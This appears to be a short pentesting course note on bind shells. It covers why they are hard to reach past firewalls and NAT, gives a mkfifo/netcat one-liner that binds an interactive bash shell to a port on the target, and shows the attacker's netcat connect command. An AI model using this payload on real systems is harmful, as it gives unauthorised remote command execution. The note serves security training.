# Bind Shell

With a bind shell, the `target system has a listener` started and awaits a connection from a pentester's system (attack box).

## Bind Challenges

- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network(public-facing), so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

## Useful Bind Shell
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l [IP] [PORT] > /tmp/f

- The commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.

## Attacker Commands

    nc -nv [IP] [PORT]
